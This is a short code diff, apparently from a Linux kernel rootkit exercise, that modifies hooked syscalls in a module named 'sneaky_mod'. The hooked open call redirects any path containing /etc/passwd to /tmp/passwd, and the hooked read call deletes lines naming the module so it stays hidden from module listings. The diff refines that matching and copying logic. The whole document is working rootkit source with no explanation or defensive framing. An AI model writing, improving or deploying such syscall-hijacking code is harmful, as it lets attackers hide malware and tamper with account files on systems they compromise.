@@ -52,7 +52,7 @@ asmlinkage int (*original_call)(const char * pathname, int flags);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
   //printk(KERN_INFO "getting into sneaky_sys_open\n");
-  if (strcmp(pathname, "/etc/passwd") == 0) {
+  if (strstr(pathname, "/etc/passwd") != NULL) {
     //printk(KERN_INFO "find /etc/passwd");
     copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
   }
@@ -114,10 +114,10 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
 
   line_start = strstr(buf, "sneaky_mod");
   if (line_start != NULL) {
-    line_end = strstr(line_start, "\n");
+    line_end = strchr(line_start, '\n');
     if(line_end !=NULL){
       line_end++;
-      memcpy(line_start, line_end, (char *)(buf + nread) - line_end);
+      memcpy(line_start, line_end, (char __user*)(buf + nread) - line_end);
       nread -= (ssize_t)(line_end - line_start);
     }
     /*
